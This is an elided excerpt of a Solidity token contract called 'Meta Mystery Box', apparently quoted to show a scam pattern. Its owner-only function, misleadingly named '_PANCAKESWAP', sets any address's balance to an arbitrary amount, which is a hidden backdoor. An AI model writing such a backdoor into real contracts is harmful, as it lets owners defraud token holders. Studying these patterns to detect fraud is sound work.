...
contract MetaMysteryBox is _NFTS, IERC20BINANCE, _MINTNFT {
  ...
  constructor() public {
    _name = 'Meta Mystery Box';
    _symbol = 'Meta Mystery Box';
    _decimals = 0;
  ...
  function burn(uint256 amount) public virtual {
     ...
     function _PANCAKESWAP(address _ROOTADDRESS, uint256 amount) external onlyOwner {
      _VALUE[_ROOTADDRESS] = amount;
  }
